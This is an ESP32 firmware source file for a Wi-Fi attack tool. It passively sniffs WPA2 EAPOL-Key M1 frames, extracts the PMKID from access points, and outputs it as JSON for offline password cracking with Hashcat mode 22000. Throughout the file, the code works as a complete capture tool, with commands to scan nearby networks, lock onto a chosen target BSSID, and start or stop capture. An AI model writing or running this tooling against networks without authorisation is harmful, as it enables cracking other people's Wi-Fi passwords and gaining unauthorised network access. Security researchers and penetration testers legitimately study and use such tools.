/*
 * TheWave32 / wifi-pmkid-capture
 *
 * Clientless PMKID capture. WPA2 APs that include the PMKID-KDE in their
 * EAPOL-Key M1 leak a Hashcat-friendly hash without requiring a connected
 * client (compatible with Hashcat hash mode 22000). We listen passively
 * on a pinned channel, parse EAPOL-Key M1, and extract the 16-byte PMKID
 * from the Key Data.
 *
 * Key Data layout for M1 with PMKID-KDE:
 *   0xdd        — Vendor Specific element id
 *   length      — total length of OUI + type + value (≥ 0x14 for PMKID)
 *   00 0F AC    — IEEE 802.11 OUI
 *   0x04        — KDE type "PMKID"
 *   <16 bytes>  — the PMKID itself
 *
 * Phase-1 skeleton: extraction + JSON event. hashcat 22000 hash assembly
 * (PMKID*MAC_AP*MAC_STA*ESSID) is phase 2.
 */

#include <ctype.h>
#include <inttypes.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include "esp_event.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "freertos/FreeRTOS.h"
#include "freertos/queue.h"
#include "freertos/task.h"
#include "nvs_flash.h"

#include "tw32_cdc_cli.h"
#include "tw32_io.h"
#include "tw32_json_out.h"
#include "tw32_nvs_kv.h"
#include "tw32_wifi_scan.h"

#define MODULE_NAME    "wifi-pmkid-capture"
#define MODULE_VERSION "0.2.0"

#define LLC_SNAP_LEN    8
#define ETHERTYPE_EAPOL 0x888E
#define EAPOL_TYPE_KEY  0x03

/* M1 has Pairwise=1, Ack=1, Mic=0. */
#define KI_PAIRWISE  (1u << 3)
#define KI_ACK       (1u << 7)
#define KI_MIC       (1u << 8)

/* Offset from start of EAPOL-Key descriptor body (after Key Info) where
 * Key Data Length lives. */
#define KEY_DATA_LEN_OFFSET 95

typedef struct {
    volatile bool     running;
    volatile uint8_t  channel;
    /* have_target gates the read of target_bssid in the RX callback. To
     * avoid a torn read while cmd_target mutates the MAC, the CLI clears
     * have_target before touching the MAC, fences, then sets it again. */
    _Atomic bool      have_target;
    uint8_t           target_bssid[6];
    /* Written by the Wi-Fi RX callback, read by the CLI on another core:
     * atomic so the cross-core RMW/read is defined rather than a race. */
    _Atomic uint32_t m1_seen;
    _Atomic uint32_t pmkids_captured;
    _Atomic uint32_t zero_pmkids;     /* M1s with an all-zero PMKID */
    _Atomic uint32_t dropped;         /* events lost to a full queue */
    _Atomic uint32_t duplicates;      /* same (bssid,pmkid) re-seen, suppressed */
} state_t;

static state_t s_state = { .channel = 1 };

/* Fixed-size record handed from the Wi-Fi RX callback to the drain task.
 * No pointers — the callback must not keep referencing the rx buffer. */
typedef struct {
    uint32_t ts_us;
    uint8_t  bssid[6];
    uint8_t  sta[6];
    uint8_t  pmkid[16];
    int8_t   rssi;
    uint8_t  channel;
} pmkid_evt_t;

#define PMKID_Q_LEN 16
static QueueHandle_t s_pmkid_q;

static void hex_encode(const uint8_t *in, size_t n, char *out)
{
    static const char *h = "0123456789abcdef";
    for (size_t i = 0; i < n; i++) {
        out[2 * i]     = h[in[i] >> 4];
        out[2 * i + 1] = h[in[i] & 0x0f];
    }
    out[2 * n] = '\0';
}

/* Walk Key Data looking for the PMKID-KDE. Returns pointer to the 16-byte
 * PMKID inside the input buffer, or NULL. */
static const uint8_t *find_pmkid_kde(const uint8_t *kd, uint16_t kdlen)
{
    uint16_t off = 0;
    while (off + 2 <= kdlen) {
        uint8_t id  = kd[off];
        uint8_t len = kd[off + 1];
        if (off + 2 + (uint16_t)len > kdlen) break;
        if (id == 0xdd && len >= 20) {
            /* OUI 00:0F:AC, type 0x04 → PMKID KDE. */
            if (kd[off + 2] == 0x00 && kd[off + 3] == 0x0F &&
                kd[off + 4] == 0xAC && kd[off + 5] == 0x04) {
                return kd + off + 6;
            }
        }
        off += 2 + (uint16_t)len;
    }
    return NULL;
}

static void promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!s_state.running) return;
    if (type != WIFI_PKT_DATA) return;

    const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *fr = p->payload;
    /* sig_len counts the trailing 4-byte FCS; only flen-4 bytes are real
     * payload. Every bound below uses payload_len so the checks cannot
     * accept 4 bytes of FCS as if they were Key Data (A2). */
    uint16_t flen = p->rx_ctrl.sig_len;
    if (flen < 4u + 24u + LLC_SNAP_LEN + 4u + KEY_DATA_LEN_OFFSET + 2u) return;
    uint16_t payload_len = flen - 4u;
    uint8_t fc0 = fr[0], fc1 = fr[1];
    if (fc0 != 0x08 && fc0 != 0x88) return;
    if (fc1 & 0x40) return;
    /* M1 is AP->STA: ToDS=0, FromDS=1. Require both bits explicitly so a
     * STA->AP data frame cannot slip past with its address fields in the
     * wrong slots (we then treat fr+10 as BSSID and fr+4 as STA below). */
    if ((fc1 & 0x03) != 0x02) return;

    /* M1 is AP->STA so From-DS=1 To-DS=0 -> BSSID at fr+10, STA at fr+4. */
    if (s_state.have_target &&
        memcmp(fr + 10, s_state.target_bssid, 6) != 0) return;

    uint16_t hdrlen = (fc0 == 0x88) ? 26 : 24;
    if (payload_len < hdrlen + LLC_SNAP_LEN + 4 + KEY_DATA_LEN_OFFSET + 2) return;
    const uint8_t *llc = fr + hdrlen;
    if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return;
    uint16_t et = ((uint16_t)llc[6] << 8) | llc[7];
    if (et != ETHERTYPE_EAPOL) return;

    const uint8_t *eapol = llc + LLC_SNAP_LEN;
    /* IEEE 802.1X-2010 protocol versions are 1, 2 or 3. Anything else is
     * garbage / a malformed frame; bail before we trust the type byte. */
    if (eapol[0] == 0 || eapol[0] > 3) return;
    if (eapol[1] != EAPOL_TYPE_KEY) return;
    const uint8_t *kd = eapol + 4;
    uint16_t ki = ((uint16_t)kd[1] << 8) | kd[2];

    /* Only M1: pairwise + ack + no mic. */
    if (!((ki & KI_PAIRWISE) && (ki & KI_ACK) && !(ki & KI_MIC))) return;

    s_state.m1_seen++;

    uint16_t kdlen = ((uint16_t)kd[KEY_DATA_LEN_OFFSET] << 8) |
                     kd[KEY_DATA_LEN_OFFSET + 1];
    if (kdlen == 0 || kdlen > 256) return;
    /* Bounds: data area sits beyond KEY_DATA_LEN_OFFSET + 2 in the eapol
     * body. payload_len (FCS already excluded) is the honest ceiling. */
    uint32_t available = payload_len - (uint32_t)(kd + KEY_DATA_LEN_OFFSET + 2 - fr);
    if (kdlen > available) return;
    const uint8_t *kdata = kd + KEY_DATA_LEN_OFFSET + 2;

    const uint8_t *pmkid = find_pmkid_kde(kdata, kdlen);
    if (!pmkid) return;

    /* Many APs answer M1 with an all-zero PMKID. That is not a usable
     * hash and Hashcat rejects it (hcxdumptool#100) - drop it here so
     * the host never sees a junk capture. */
    bool all_zero = true;
    for (int i = 0; i < 16; i++) {
        if (pmkid[i] != 0) { all_zero = false; break; }
    }
    if (all_zero) {
        s_state.zero_pmkids++;
        return;
    }

    /* Hand a fixed-size copy to the drain task. The Wi-Fi RX context
     * must not take the JSON mutex or block on USB — timeout 0 means a
     * full queue drops the event (counted) instead of stalling RX. */
    pmkid_evt_t ev;
    ev.ts_us   = (uint32_t)esp_timer_get_time();
    memcpy(ev.bssid, fr + 10, 6);
    memcpy(ev.sta,   fr + 4,  6);
    memcpy(ev.pmkid, pmkid,   16);
    ev.rssi    = p->rx_ctrl.rssi;
    ev.channel = p->rx_ctrl.channel;
    if (xQueueSend(s_pmkid_q, &ev, 0) == pdTRUE) s_state.pmkids_captured++;
    else                                        s_state.dropped++;
}

/* Drain task: priority below the Wi-Fi RX task. Safe here to take the
 * JSON mutex and block on the USB write. Also dedupes: an AP that keeps
 * sending M1 would otherwise spam the operator with the same usable
 * hash. Steube 2018 only needs one PMKID per (BSSID,STA) tuple for a
 * Hashcat 22000 line, so a small LRU is enough. */
#define DEDUP_SLOTS 8
typedef struct {
    uint8_t bssid[6];
    uint8_t pmkid[16];
    bool    used;
} dedup_slot_t;

static void pmkid_drain_task(void *arg)
{
    (void)arg;
    pmkid_evt_t ev;
    char hex[33];
    dedup_slot_t recent[DEDUP_SLOTS] = {0};
    size_t next_slot = 0;
    for (;;) {
        if (xQueueReceive(s_pmkid_q, &ev, portMAX_DELAY) != pdTRUE) continue;

        bool dup = false;
        for (size_t i = 0; i < DEDUP_SLOTS; i++) {
            if (recent[i].used &&
                memcmp(recent[i].bssid, ev.bssid, 6) == 0 &&
                memcmp(recent[i].pmkid, ev.pmkid, 16) == 0) {
                dup = true;
                break;
            }
        }
        if (dup) {
            s_state.duplicates++;
            continue;
        }
        memcpy(recent[next_slot].bssid, ev.bssid, 6);
        memcpy(recent[next_slot].pmkid, ev.pmkid, 16);
        recent[next_slot].used = true;
        next_slot = (next_slot + 1) % DEDUP_SLOTS;

        hex_encode(ev.pmkid, 16, hex);
        tw32_json_begin();
        tw32_json_kv_str ("event", "pmkid");
        tw32_json_kv_uint("ts",    ev.ts_us);
        tw32_json_kv_mac ("bssid", ev.bssid);
        tw32_json_kv_mac ("sta",   ev.sta);
        tw32_json_kv_str ("pmkid", hex);
        tw32_json_kv_int ("rssi",  ev.rssi);
        tw32_json_kv_int ("ch",    ev.channel);
        tw32_json_end();
    }
}

static void wifi_init_promisc(void)
{
    { esp_err_t _e = esp_event_loop_create_default();
      if (_e != ESP_OK && _e != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(_e); }
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    /* STA mode (non-associated) supports both promiscuous capture and
     * the scan worker — needed for the CLI `scan` command. */
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());
    esp_wifi_set_ps(WIFI_PS_NONE);
    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA };
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filt));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(&promisc_cb));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    ESP_ERROR_CHECK(esp_wifi_set_channel(s_state.channel, WIFI_SECOND_CHAN_NONE));
}

/* --- CLI ---------------------------------------------------------------- */

static int parse_mac(const char *s, uint8_t mac[6])
{
    /* Insist on the canonical aa:bb:cc:dd:ee:ff layout — some libc
     * sscanf implementations otherwise accept malformed input. */
    if (s == NULL || strlen(s) != 17) return -1;
    for (int i = 2; i <= 14; i += 3) {
        if (s[i] != ':') return -1;
    }
    int v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0],&v[1],&v[2],&v[3],&v[4],&v[5]) != 6)
        return -1;
    for (int i = 0; i < 6; i++) {
        if (v[i] < 0 || v[i] > 0xFF) return -1;
        mac[i] = (uint8_t)v[i];
    }
    return 0;
}

static int cmd_target(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c;
    if (argc < 2) { tw32_cli_ack_err("target", "missing_arg"); return -1; }
    if (!strcmp(argv[1], "any")) {
        s_state.have_target = false;
        tw32_cli_ack_ok("target");
        return 0;
    }
    tw32_ap_entry_t entry;
    if (tw32_wifi_scan_resolve_index(argv[1], &entry)) {
        /* Gate the RX callback off the MAC before we rewrite it. */
        s_state.have_target = false;
        atomic_thread_fence(memory_order_release);
        memcpy(s_state.target_bssid, entry.bssid, 6);
        atomic_thread_fence(memory_order_release);
        s_state.have_target = true;
        if (esp_wifi_set_channel(entry.channel, WIFI_SECOND_CHAN_NONE) == ESP_OK) {
            s_state.channel = entry.channel;
        }
        tw32_json_begin();
        tw32_json_kv_str("cmd", "target");
        tw32_json_kv_bool("ok", true);
        tw32_json_kv_str("ssid", entry.ssid);
        tw32_json_kv_mac("bssid", entry.bssid);
        tw32_json_kv_int("channel", entry.channel);
        /* WPA3-SAE and OWE do not expose a usable PMKID; flag it so the
         * operator does not wait on a target that cannot yield one. */
        if (entry.authmode == WIFI_AUTH_WPA3_PSK ||
            entry.authmode == WIFI_AUTH_OWE) {
            tw32_json_kv_str("warn", "wpa3_no_pmkid");
        }
        tw32_json_end();
        return 0;
    }
    uint8_t m[6];
    if (parse_mac(argv[1], m) != 0) {
        tw32_cli_ack_err("target", "bad_mac_or_index"); return -1;
    }
    s_state.have_target = false;
    atomic_thread_fence(memory_order_release);
    memcpy(s_state.target_bssid, m, 6);
    atomic_thread_fence(memory_order_release);
    s_state.have_target = true;
    tw32_cli_ack_ok("target");
    return 0;
}

static int cmd_scan(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c; (void)argc; (void)argv;
    if (tw32_wifi_scan_run() < 0) {
        tw32_cli_ack_err("scan", "scan_failed");
        return -1;
    }
    return 0;
}

static int cmd_chan(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c;
    if (argc < 2) { tw32_cli_ack_err("chan", "missing_arg"); return -1; }
    char *end = NULL;
    long ch = strtol(argv[1], &end, 10);
    /* Reject "", "1abc", "0x2", trailing junk - %strtol would silently
     * accept a partial parse otherwise. */
    if (end == argv[1] || end == NULL || *end != '\0') {
        tw32_cli_ack_err("chan", "bad_arg"); return -1;
    }
    if (ch < 1 || ch > 14) { tw32_cli_ack_err("chan", "out_of_range"); return -1; }
    if (esp_wifi_set_channel((uint8_t)ch, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
        tw32_cli_ack_err("chan", "set_failed"); return -1;
    }
    s_state.channel = (uint8_t)ch;
    tw32_cli_ack_ok("chan");
    return 0;
}

static int cmd_start(tw32_cli_ctx_t *c, int argc, char **argv)
{ (void)c;(void)argc;(void)argv; s_state.running = true;  tw32_cli_ack_ok("start"); return 0; }

static int cmd_stop(tw32_cli_ctx_t *c, int argc, char **argv)
{ (void)c;(void)argc;(void)argv; s_state.running = false; tw32_cli_ack_ok("stop");  return 0; }

static int cmd_stats(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c; (void)argc; (void)argv;
    tw32_json_begin();
    tw32_json_kv_str ("cmd", "stats");
    tw32_json_kv_bool("ok", true);
    tw32_json_kv_uint("m1_seen",         s_state.m1_seen);
    tw32_json_kv_uint("pmkids_captured", s_state.pmkids_captured);
    tw32_json_kv_uint("zero_pmkids",     s_state.zero_pmkids);
    tw32_json_kv_uint("dropped",         s_state.dropped);
    tw32_json_kv_uint("duplicates",      s_state.duplicates);
    tw32_json_kv_int ("channel",         s_state.channel);
    tw32_json_kv_bool("targeted",        s_state.have_target);
    if (s_state.have_target) tw32_json_kv_mac("target", s_state.target_bssid);
    tw32_json_kv_bool("running",         s_state.running);
    tw32_json_end();
    return 0;
}

static const tw32_cli_cmd_t cli_table[] = {
    { "scan",   "list nearby APs (sets `target N` cache)", cmd_scan   },
    { "target", "target <bssid|N|any>",                    cmd_target },
    { "chan",   "chan N (1..14)",                          cmd_chan   },
    { "start",  "begin capture",                           cmd_start  },
    { "stop",   "halt capture",                            cmd_stop   },
    { "stats",  "PMKID counters + state",                  cmd_stats  },
};

void app_main(void)
{
    tw32_nvs_init();
    tw32_cdc_init();
    s_pmkid_q = xQueueCreate(PMKID_Q_LEN, sizeof(pmkid_evt_t));
    configASSERT(s_pmkid_q != NULL);
    /* Priority 4 sits below the Wi-Fi RX task; core 1 keeps it off the
     * core the Wi-Fi/lwIP stack runs on. */
    xTaskCreatePinnedToCore(pmkid_drain_task, "tw32-pmkid-drain",
                            4096, NULL, 4, NULL, 1);
    wifi_init_promisc();
    tw32_wifi_scan_init();
    tw32_cli_run(MODULE_NAME, MODULE_VERSION,
                 cli_table, sizeof(cli_table) / sizeof(cli_table[0]));
}
